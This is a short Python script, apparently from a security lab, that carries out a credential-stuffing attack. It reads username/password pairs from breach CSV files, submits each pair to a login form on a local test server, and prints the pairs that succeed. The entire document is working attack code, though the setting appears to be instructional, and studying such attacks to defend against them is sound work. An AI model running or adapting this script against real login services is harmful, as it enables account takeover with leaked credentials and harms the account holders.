from csv import reader
from requests import post, codes

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    for cred in creds:
        status = attempt_login(cred[0],cred[1])
        if status:
            print(cred)
    return

def main():
    creds = load_breach(HASHED_BREACH_PATH)
    credential_stuffing_attack(creds)

if __name__ == "__main__":
    main()
